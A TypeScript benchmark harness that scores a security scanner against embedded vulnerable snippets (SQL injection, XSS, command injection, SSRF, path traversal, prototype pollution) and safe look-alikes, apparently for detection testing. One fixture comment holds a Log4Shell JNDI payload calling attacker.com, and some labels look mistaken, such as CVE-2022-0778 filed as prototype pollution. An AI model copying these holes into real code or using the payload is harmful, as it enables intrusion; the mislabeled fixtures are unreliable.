// ─────────────────────────────────────────────────────────────────────────────
// BENCHMARK & REGRESSION HARNESS — v1.4
//
// Objective measurement of scanner accuracy:
//   • OWASP Benchmark-style test vector library
//   • Juliet Test Suite pattern coverage
//   • CVE replay fixtures
//   • FP/FN metrics + precision/recall tracking
//   • Per-run regression detection
//
// Design: all test vectors are embedded (no network). The harness runs
// deterministic-only to avoid AI variance contaminating accuracy metrics.
// ─────────────────────────────────────────────────────────────────────────────

import type { Issue } from './utils';

// ─── Types ────────────────────────────────────────────────────────────────────

export type VulnClass =
  | 'sqli' | 'xss' | 'ssrf' | 'cmd' | 'path' | 'proto'
  | 'redirect' | 'auth' | 'deserialize' | 'idor';

export interface TestVector {
  id:          string;
  name:        string;
  vulnClass:   VulnClass;
  /** true = must be flagged; false = must NOT be flagged (FP trap) */
  shouldFlag:  boolean;
  severity:    'high' | 'medium' | 'low';
  code:        string;
  /** Line that should be flagged (only checked when shouldFlag=true) */
  expectedLine?: number;
  source:      'OWASP' | 'Juliet' | 'CVE' | 'internal';
  cve?:        string;
}

export interface BenchmarkResult {
  vectorId:     string;
  name:         string;
  vulnClass:    VulnClass;
  shouldFlag:   boolean;
  wasFlagged:   boolean;
  /** true positive | false positive | true negative | false negative */
  outcome:      'TP' | 'FP' | 'TN' | 'FN';
  issuesFound:  Issue[];
}

export interface BenchmarkStats {
  total:        number;
  tp:           number;
  fp:           number;
  tn:           number;
  fn:           number;
  precision:    number;   // TP / (TP + FP)
  recall:       number;   // TP / (TP + FN)
  f1:           number;
  accuracy:     number;
  fpRate:       number;   // FP / (FP + TN) — lower is better
  byClass:      Record<VulnClass, { tp: number; fp: number; tn: number; fn: number }>;
}

export interface RegressionReport {
  runId:        string;
  timestamp:    number;
  stats:        BenchmarkStats;
  regressions:  RegressionDelta[];   // outcomes that got WORSE vs baseline
  improvements: RegressionDelta[];   // outcomes that got BETTER
  baselineId:   string | null;
}

export interface RegressionDelta {
  vectorId:   string;
  name:       string;
  wasOutcome: 'TP' | 'FP' | 'TN' | 'FN';
  nowOutcome: 'TP' | 'FP' | 'TN' | 'FN';
}

// ─── Embedded test vectors ─────────────────────────────────────────────────

export const TEST_VECTORS: TestVector[] = [
  // ── OWASP-style: true positives ──────────────────────────────────────────
  {
    id: 'OWASP-SQLI-001', name: 'Raw SQL with req.query injection',
    vulnClass: 'sqli', shouldFlag: true, severity: 'high', source: 'OWASP',
    expectedLine: 2,
    code: `app.get('/users', async (req, res) => {\n  const rows = await db.query(\`SELECT * FROM users WHERE id = \${req.query.id}\`);\n  res.json(rows);\n});`,
  },
  {
    id: 'OWASP-XSS-001', name: 'innerHTML with req.body',
    vulnClass: 'xss', shouldFlag: true, severity: 'high', source: 'OWASP',
    expectedLine: 2,
    code: `app.post('/render', (req, res) => {\n  element.innerHTML = req.body.content;\n  res.send('ok');\n});`,
  },
  {
    id: 'OWASP-CMD-001', name: 'exec with user input',
    vulnClass: 'cmd', shouldFlag: true, severity: 'high', source: 'OWASP',
    expectedLine: 2,
    code: `app.post('/run', (req, res) => {\n  exec(req.body.cmd, (err, out) => res.send(out));\n});`,
  },
  {
    id: 'OWASP-SSRF-001', name: 'fetch with req.query.url',
    vulnClass: 'ssrf', shouldFlag: true, severity: 'high', source: 'OWASP',
    expectedLine: 2,
    code: `app.get('/proxy', async (req, res) => {\n  const result = await fetch(req.query.url);\n  res.send(await result.text());\n});`,
  },
  {
    id: 'OWASP-PATH-001', name: 'readFile with user path',
    vulnClass: 'path', shouldFlag: true, severity: 'high', source: 'OWASP',
    expectedLine: 2,
    code: `app.get('/file', (req, res) => {\n  const data = fs.readFileSync(join('/uploads', req.query.name));\n  res.send(data);\n});`,
  },
  // ── Juliet-style: FP traps (true negatives) ───────────────────────────────
  {
    id: 'Juliet-SQLI-FP-001', name: 'Parameterized query — should NOT flag',
    vulnClass: 'sqli', shouldFlag: false, severity: 'high', source: 'Juliet',
    code: `app.get('/users', async (req, res) => {\n  const rows = await db.query('SELECT * FROM users WHERE id = ?', [req.query.id]);\n  res.json(rows);\n});`,
  },
  {
    id: 'Juliet-XSS-FP-001', name: 'DOMPurify sanitized — should NOT flag',
    vulnClass: 'xss', shouldFlag: false, severity: 'high', source: 'Juliet',
    code: `const clean = DOMPurify.sanitize(req.body.content);\nelement.innerHTML = clean;`,
  },
  {
    id: 'Juliet-CMD-FP-001', name: 'Allowlisted exec — should NOT flag',
    vulnClass: 'cmd', shouldFlag: false, severity: 'high', source: 'Juliet',
    code: `const ALLOWED = ['ls', 'pwd', 'date'];\nif (!ALLOWED.includes(req.body.cmd)) return res.status(400).send();\nexec(req.body.cmd, (err, out) => res.send(out));`,
  },
  {
    id: 'Juliet-SSRF-FP-001', name: 'URL parsed and validated — should NOT flag',
    vulnClass: 'ssrf', shouldFlag: false, severity: 'medium', source: 'Juliet',
    code: `const url = new URL(req.query.target);\nif (url.hostname !== 'api.trusted.com') return res.status(403).send();\nconst r = await fetch(url.toString());\nres.send(await r.text());`,
  },
  // ── CVE fixtures ─────────────────────────────────────────────────────────
  {
    id: 'CVE-2021-44228-log4shell', name: 'Log4Shell JNDI injection pattern',
    vulnClass: 'ssrf', shouldFlag: true, severity: 'high', source: 'CVE',
    cve: 'CVE-2021-44228',
    code: `// Simulated JNDI-style lookup via user-controlled input\nconst userAgent = req.headers['user-agent'];\nlogger.info('Request from: ' + userAgent);  // ${'\u0024'}{jndi:ldap://attacker.com/a}`,
  },
  {
    id: 'CVE-2022-0778-proto-pollution', name: 'Prototype pollution via merge',
    vulnClass: 'proto', shouldFlag: true, severity: 'high', source: 'CVE',
    cve: 'CVE-2022-0778',
    expectedLine: 2,
    code: `app.post('/config', (req, res) => {\n  Object.assign(appConfig, req.body);\n  res.send('updated');\n});`,
  },
  // ── Internal: dead-code FP traps ─────────────────────────────────────────
  {
    id: 'internal-dead-001', name: 'Dead branch — should NOT flag',
    vulnClass: 'sqli', shouldFlag: false, severity: 'high', source: 'internal',
    code: `if (false) {\n  const rows = await db.query(\`SELECT * FROM users WHERE id = \${req.query.id}\`);\n}`,
  },
  {
    id: 'internal-test-001', name: 'Jest test mock — should NOT flag',
    vulnClass: 'xss', shouldFlag: false, severity: 'medium', source: 'internal',
    code: `describe('XSS test', () => {\n  it('renders content', () => {\n    element.innerHTML = req.body.content;  // intentional in test\n  });\n});`,
  },

  // ── v1.4.1 expanded vectors — true positives ────────────────────────────
  {
    id: 'OWASP-CMD-002', name: 'execSync with template literal from req.query',
    vulnClass: 'cmd', shouldFlag: true, severity: 'high', source: 'OWASP',
    expectedLine: 2,
    code: `const { filename } = req.query;\nconst out = execSync(\`convert \${filename} output.png\`);\nres.send(out);`,
  },
  {
    id: 'OWASP-PROTO-002', name: 'for..in merge without __proto__ guard',
    vulnClass: 'proto', shouldFlag: true, severity: 'high', source: 'OWASP',
    expectedLine: 3,
    code: `function merge(target, source) {\n  for (const key in source) {\n    target[key] = source[key];\n  }\n  return target;\n}`,
  },
  {
    id: 'OWASP-EVAL-001', name: 'Function() constructor with user input',
    vulnClass: 'cmd', shouldFlag: true, severity: 'high', source: 'OWASP',
    expectedLine: 2,
    code: `app.post('/run', (req, res) => {\n  const result = Function(req.body.code)();\n  res.json({ result });\n});`,
  },
  {
    id: 'OWASP-REDIRECT-001', name: 'Open redirect with req.query url',
    vulnClass: 'redirect', shouldFlag: true, severity: 'high', source: 'OWASP',
    expectedLine: 2,
    code: `app.get('/go', (req, res) => {\n  res.redirect(req.query.url);\n});`,
  },
  {
    id: 'CVE-2022-SSRF-001', name: 'SSRF — fetch with user-controlled host',
    vulnClass: 'ssrf', shouldFlag: true, severity: 'high', source: 'CVE',
    expectedLine: 2,
    code: `app.get('/proxy', async (req, res) => {\n  const data = await fetch(req.query.target).then(r => r.text());\n  res.send(data);\n});`,
  },
  {
    id: 'OWASP-AUTH-001', name: 'Missing await on async auth — always passes',
    vulnClass: 'auth', shouldFlag: true, severity: 'high', source: 'OWASP',
    expectedLine: 2,
    code: `async function verifyToken(token) { return await jwt.verify(token, SECRET); }\nif (verifyToken(req.headers.authorization)) {\n  allowAccess();\n}`,
  },
  {
    id: 'OWASP-IDOR-001', name: 'IDOR — user ID taken from request, no ownership check',
    vulnClass: 'idor', shouldFlag: true, severity: 'high', source: 'OWASP',
    expectedLine: 2,
    code: `app.get('/files/:id', async (req, res) => {\n  const file = await db.query('SELECT * FROM files WHERE id = ?', [req.params.id]);\n  res.json(file);  // no check that file.userId === req.user.id\n});`,
  },
  {
    id: 'OWASP-ENV-001', name: 'process.env leaked to HTTP response',
    vulnClass: 'ssrf', shouldFlag: true, severity: 'high', source: 'OWASP',
    expectedLine: 2,
    code: `app.get('/debug', (req, res) => {\n  res.send({ env: process.env, key: process.env.API_KEY });\n});`,
  },
  {
    id: 'OWASP-DESER-001', name: 'node-serialize with user input',
    vulnClass: 'deserialize', shouldFlag: true, severity: 'high', source: 'OWASP',
    expectedLine: 2,
    code: `const serialize = require('node-serialize');\nconst obj = serialize.unserialize(req.body.data);\nres.json(obj);`,
  },
  {
    id: 'OWASP-PATH-002', name: 'Path traversal via req.params filename',
    vulnClass: 'path', shouldFlag: true, severity: 'high', source: 'OWASP',
    expectedLine: 2,
    code: `app.get('/file/:name', (req, res) => {\n  const content = fs.readFileSync('./uploads/' + req.params.name);\n  res.send(content);\n});`,
  },

  // ── v1.4.1 expanded vectors — false positive traps ──────────────────────
  {
    id: 'Juliet-PROTO-001', name: 'Object.assign with hardcoded object — NOT proto pollution',
    vulnClass: 'proto', shouldFlag: false, severity: 'high', source: 'Juliet',
    code: `const config = Object.assign({}, defaultConfig, { timeout: 5000, retries: 3 });`,
  },
  {
    id: 'Juliet-EVAL-001', name: 'Function() with hardcoded string — NOT user input',
    vulnClass: 'cmd', shouldFlag: false, severity: 'high', source: 'Juliet',
    code: `const add = new Function('a', 'b', 'return a + b');\nconst result = add(1, 2);`,
  },
  {
    id: 'Juliet-REDIRECT-001', name: 'res.redirect with hardcoded path — NOT open redirect',
    vulnClass: 'redirect', shouldFlag: false, severity: 'high', source: 'Juliet',
    code: `app.get('/login', (req, res) => {\n  res.redirect('/dashboard');\n});`,
  },
  {
    id: 'Juliet-CMD-002', name: 'spawn with array args — NOT injectable',
    vulnClass: 'cmd', shouldFlag: false, severity: 'high', source: 'Juliet',
    code: `const child = spawn('ls', ['-la', '/tmp'], { shell: false });`,
  },
  {
    id: 'Juliet-PATH-001', name: 'path.join with hardcoded parts — NOT traversal',
    vulnClass: 'path', shouldFlag: false, severity: 'high', source: 'Juliet',
    code: `const filePath = path.join(__dirname, 'public', 'index.html');\nres.sendFile(filePath);`,
  },
  {
    id: 'Juliet-SQLI-003', name: 'Prisma ORM query — NOT injectable',
    vulnClass: 'sqli', shouldFlag: false, severity: 'high', source: 'Juliet',
    code: `const user = await prisma.user.findFirst({ where: { email: req.body.email } });`,
  },
  {
    id: 'internal-guard-001', name: 'Guard clause before SQL — validated input',
    vulnClass: 'sqli', shouldFlag: false, severity: 'high', source: 'internal',
    code: `const id = req.query.id;\nif (!id || typeof id !== 'string') return res.status(400).send('bad id');\nconst rows = await db.query('SELECT * FROM items WHERE id = ?', [id]);`,
  },
  {
    id: 'internal-parameterized-001', name: 'Parameterized query with req.body — NOT SQLi',
    vulnClass: 'sqli', shouldFlag: false, severity: 'high', source: 'internal',
    code: `const { username } = req.body;\nconst result = await db.query('SELECT * FROM users WHERE username = ?', [username]);`,
  },

  // ── Python true positives ────────────────────────────────────────────────
  {
    id: 'PY-SQLI-001', name: 'Python f-string SQL injection',
    vulnClass: 'sqli', shouldFlag: true, severity: 'high', source: 'OWASP',
    expectedLine: 2,
    code: `def get_user(user_id):\n    query = f"SELECT * FROM users WHERE id = {user_id}"\n    cursor.execute(query)\n    return cursor.fetchall()`,
  },
  {
    id: 'PY-HARDCODED-001', name: 'Python hardcoded password',
    vulnClass: 'sqli', shouldFlag: true, severity: 'high', source: 'OWASP',
    expectedLine: 1,
    code: `PASSWORD = "admin123"\ndef login(input_password):\n    return input_password == PASSWORD`,
  },
  {
    id: 'PY-DIVISION-001', name: 'Python division by zero',
    vulnClass: 'logic', shouldFlag: true, severity: 'medium', source: 'internal',
    expectedLine: 3,
    code: `def calculate_average(numbers):\n    total = sum(numbers)\n    return total / len(numbers)`,
  },
  {
    id: 'PY-RESOURCE-001', name: 'Python DB connection leak',
    vulnClass: 'logic', shouldFlag: true, severity: 'medium', source: 'internal',
    expectedLine: 1,
    code: `conn = sqlite3.connect("users.db")\ncursor = conn.cursor()\ncursor.execute("SELECT * FROM users")\nreturn cursor.fetchall()`,
  },
  {
    id: 'PY-TIMING-001', name: 'Python plaintext password comparison — timing attack',
    vulnClass: 'auth', shouldFlag: true, severity: 'high', source: 'OWASP',
    expectedLine: 2,
    code: `correct_password = "secret123"\ndef verify(input_password):\n    return input_password == correct_password`,
  },

  // ── Python false positive traps ──────────────────────────────────────────
  {
    id: 'PY-FP-SQLI-001', name: 'Python parameterized query — NOT SQLi',
    vulnClass: 'sqli', shouldFlag: false, severity: 'high', source: 'Juliet',
    code: `def get_user(user_id):\n    cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))\n    return cursor.fetchall()`,
  },
  {
    id: 'PY-FP-AUTH-001', name: 'Python bcrypt comparison — NOT timing attack',
    vulnClass: 'auth', shouldFlag: false, severity: 'high', source: 'Juliet',
    code: `import bcrypt\ndef verify(input_password, stored_hash):\n    return bcrypt.checkpw(input_password.encode(), stored_hash)`,
  },
  {
    id: 'PY-FP-CMD-001', name: 'Python subprocess with list args — NOT injectable',
    vulnClass: 'cmd', shouldFlag: false, severity: 'high', source: 'Juliet',
    code: `import subprocess\nresult = subprocess.run(["ls", "-la", "/tmp"], capture_output=True)`,
  },
];

// ─── Core benchmark runner ─────────────────────────────────────────────────

/**
 * Run a set of test vectors against a provided issue-extraction function.
 * The extractor receives the vector code and returns the issues found.
 */
export function runBenchmark(
  vectors: TestVector[],
  extractor: (code: string) => Issue[],
): BenchmarkResult[] {
  return vectors.map(vec => {
    const issues = extractor(vec.code);

    // A vector is "flagged" if any issue matches its vuln class
    const wasFlagged = issues.some(i =>
      i.category.toLowerCase().includes(vec.vulnClass) ||
      i.title.toLowerCase().includes(vec.vulnClass) ||
      i.severity === vec.severity
    );

    let outcome: BenchmarkResult['outcome'];
    if (vec.shouldFlag && wasFlagged)   outcome = 'TP';
    else if (!vec.shouldFlag && !wasFlagged) outcome = 'TN';
    else if (!vec.shouldFlag && wasFlagged)  outcome = 'FP';
    else                                outcome = 'FN';

    return { vectorId: vec.id, name: vec.name, vulnClass: vec.vulnClass, shouldFlag: vec.shouldFlag, wasFlagged, outcome, issuesFound: issues };
  });
}

// ─── Stats calculation ────────────────────────────────────────────────────

export function calculateStats(results: BenchmarkResult[]): BenchmarkStats {
  const classes = [...new Set(results.map(r => r.vulnClass))] as VulnClass[];
  const byClass = Object.fromEntries(
    classes.map(c => [c, { tp: 0, fp: 0, tn: 0, fn: 0 }])
  ) as Record<VulnClass, { tp: number; fp: number; tn: number; fn: number }>;

  let tp = 0, fp = 0, tn = 0, fn = 0;
  for (const r of results) {
    if (r.outcome === 'TP') { tp++; byClass[r.vulnClass].tp++; }
    else if (r.outcome === 'FP') { fp++; byClass[r.vulnClass].fp++; }
    else if (r.outcome === 'TN') { tn++; byClass[r.vulnClass].tn++; }
    else                         { fn++; byClass[r.vulnClass].fn++; }
  }

  const precision = tp + fp > 0 ? tp / (tp + fp) : 1;
  const recall    = tp + fn > 0 ? tp / (tp + fn) : 1;
  const f1        = precision + recall > 0 ? 2 * precision * recall / (precision + recall) : 0;
  const accuracy  = results.length > 0 ? (tp + tn) / results.length : 1;
  const fpRate    = fp + tn > 0 ? fp / (fp + tn) : 0;

  return { total: results.length, tp, fp, tn, fn, precision, recall, f1, accuracy, fpRate, byClass };
}

// ─── Regression detection ─────────────────────────────────────────────────

const _history: Map<string, BenchmarkResult[]> = new Map(); // runId → results

export function detectRegressions(
  runId: string,
  current: BenchmarkResult[],
  baselineRunId: string | null,
): RegressionReport {
  _history.set(runId, current);
  const baseline = baselineRunId ? _history.get(baselineRunId) : null;

  const regressions: RegressionDelta[] = [];
  const improvements: RegressionDelta[] = [];

  if (baseline) {
    const baseMap = new Map(baseline.map(r => [r.vectorId, r.outcome]));
    for (const cur of current) {
      const was = baseMap.get(cur.vectorId);
      if (!was || was === cur.outcome) continue;
      const worse = (was === 'TP' && cur.outcome === 'FN') ||
                    (was === 'TN' && cur.outcome === 'FP');
      const better = (was === 'FN' && cur.outcome === 'TP') ||
                     (was === 'FP' && cur.outcome === 'TN');
      if (worse)  regressions.push({ vectorId: cur.vectorId, name: cur.name, wasOutcome: was, nowOutcome: cur.outcome });
      if (better) improvements.push({ vectorId: cur.vectorId, name: cur.name, wasOutcome: was, nowOutcome: cur.outcome });
    }
  }

  return {
    runId, timestamp: Date.now(),
    stats: calculateStats(current),
    regressions, improvements,
    baselineId: baselineRunId,
  };
}

export function getLatestRunId(): string | null {
  const keys = [..._history.keys()];
  return keys[keys.length - 1] ?? null;
}
